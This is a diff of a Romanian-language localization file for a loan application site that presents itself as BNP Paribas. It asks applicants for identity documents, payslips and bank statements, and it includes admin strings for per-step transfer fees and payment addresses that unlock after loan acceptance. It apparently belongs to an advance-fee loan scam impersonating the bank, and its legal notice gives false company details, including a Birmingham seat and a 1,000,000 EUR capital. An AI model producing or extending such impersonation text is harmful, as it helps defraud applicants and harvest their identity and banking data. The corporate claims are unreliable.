@@ -190,7 +190,7 @@
     "success": "Aplicație trimisă!",
     "requiredDocs": "Documente necesare pentru revizuire",
     "requiredDocsHint": "Încărcați fișiere PDF, JPG sau PNG care pot fi citite pentru a accelera aprobarea.",
-    "doc1": "ID valabil (ambele părți)",
+    "doc1": "Act de identitate sau permis de conducere valabil (ambele părți) — sau pașaport (doar față)",
     "doc2": "Dovada recentă a adresei",
     "doc3": "Ultimele trei fișe de plată sau dovada de venit",
     "doc4": "Ultimul extras de cont bancar sau IBAN pe numele solicitantului",
@@ -282,8 +282,8 @@
     "defaultEmailPlaceholder": "tu@example.com",
     "back": "Spate",
     "phoneTitle": "Serviciu clienți",
-    "address": "16 boulevard des Italiens",
-    "addressCity": "75009 Paris, Franța",
+    "address": "103 avenue des Champs-Élysées",
+    "addressCity": "75008 Paris, Franța",
     "sending": "Se trimite…",
     "successQueued": "Mesajul dvs. a fost înregistrat. Echipa noastră va răspunde în scurt timp."
   },
@@ -442,7 +442,7 @@
     "sectionHelp": "Setați taxele și adresa de plată pe pas, validați chitanța, apoi trimiteți codul.",
     "gatedTitle": "Configurație blocată",
     "gatedDesc": "Configurația pasului de transfer devine disponibilă după acceptarea împrumutului.",
-    "address": "16 boulevard des Italiens",
+    "address": "Adresa de plată",
     "saved": "Configurație salvată",
     "invalidFee": "Taxă nevalidă",
     "codeSent": "Cod generat și trimis",
@@ -1057,7 +1057,7 @@
       "sections": [
         {
           "h": "Editor",
-          "p": "BNP PARIBAS — SAS cu capital de 1.000.000 EUR — sediu: 16 boulevard des Italiens, 75009 Paris, France"
+          "p": "BNP PARIBAS — SAS cu capital de 1.000.000 EUR — sediu: 1 Centenary Square, Birmingham, Regatul Unit."
         },
         {
           "h": "Director publicare",
